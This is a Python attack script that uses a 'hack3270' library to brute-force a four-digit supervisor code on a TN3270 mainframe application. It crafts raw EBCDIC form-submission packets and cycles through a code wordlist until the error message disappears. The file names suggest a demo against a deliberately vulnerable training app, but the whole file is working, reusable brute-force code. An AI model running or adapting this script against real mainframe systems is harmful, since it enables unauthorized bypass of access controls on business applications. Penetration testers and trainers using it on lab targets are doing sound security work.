#!/usr/bin/env python3
"""
brute2.py - Brute force supervisor code using raw packets (no .db file)

Builds TN3270 packets programmatically with supervisor codes converted
from ASCII to EBCDIC at runtime. Sends full form data with address fields.
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'hack3270_libs'))

import time
from hack3270_api import Hack3270API

# Configuration
API_HOST = '127.0.0.1'
API_PORT = 31337
DELAY = 0.3

# Injection settings
INJECTION_FILE = '../injections/dvca-demo-numeric-4.txt'
ERROR_MSG = 'INVALID SUPERVISOR CODE'

# TN3270 constants
AID_ENTER = 0x7D
SBA = 0x11
IAC_EOR = bytes([0xFF, 0xEF])

# Form field addresses (from captured packet)
CURSOR_ADDR = bytes([0xC6, 0xE7])

# Field data - (address, ASCII text, field_length)
# These get padded with spaces to field_length
FORM_FIELDS = [
    (bytes([0xC6, 0xE7]), 'Phillip Young', 44),
    (bytes([0xC9, 0xC7]), '101 Adelaide St W', 44),
    (bytes([0x4B, 0xE7]), 'Toronto', 44),
    (bytes([0x4E, 0xC7]), 'Ontario', 44),
    (bytes([0x50, 0xE7]), 'M5H 0B3', 44),
    (bytes([0xD3, 0xC7]), 'Canada', 44),
]
CODE_FIELD_ADDR = bytes([0xD5, 0xE7])


def build_code_packet(api, code):
    """
    Build a full TN3270 form submission packet with the supervisor code.
    
    Includes all address fields plus the 4-digit code.
    Handles TN3270E mode automatically.
    """
    # Start with TN3270E header if needed
    if api.is_tn3270e():
        packet = bytes([0x00, 0x00, 0x00, 0x00, 0x01, AID_ENTER]) + CURSOR_ADDR
    else:
        packet = bytes([AID_ENTER]) + CURSOR_ADDR
    
    # Add all address fields
    for field_addr, text, length in FORM_FIELDS:
        padded_text = text.ljust(length)[:length]  # Pad/truncate to length
        ebcdic_data = api.ascii_to_ebcdic(padded_text)
        packet += bytes([SBA]) + field_addr + ebcdic_data
    
    # Add supervisor code field (4 chars, no padding)
    ebcdic_code = api.ascii_to_ebcdic(code)
    packet += bytes([SBA]) + CODE_FIELD_ADDR + ebcdic_code
    
    # Add terminator
    packet += IAC_EOR
    
    return packet


def main():
    api = Hack3270API(host=API_HOST, port=API_PORT)
    
    print("Supervisor Code Brute Force (Raw Packets)")
    print("=" * 50)
    
    # Connect to API
    api.connect()
    print("Connected!\n")
    
    try:
        # Load codes from file
        codes = api.load_injection_file(INJECTION_FILE)
        print(f"Loaded {len(codes)} codes to try\n")
        
        found = False
        
        for i, code in enumerate(codes, 1):
            # Build and send packet
            packet = build_code_packet(api, code)
            desc = f'Brute: code {code}'
            api.send_raw(packet, desc)
            time.sleep(DELAY)
            
            # Check response
            response = api.get_last_server()
            
            if ERROR_MSG not in response:
                print(f"\n*** FOUND: {code} ***")
                found = True
                break
            
            if i % 10 == 0:
                print(f"[{i}/{len(codes)}]")
        
        if not found:
            print("\nNo valid code found in wordlist.")
    
    finally:
        api.disconnect()
        print("\nDisconnected.")


if __name__ == '__main__':
    main()
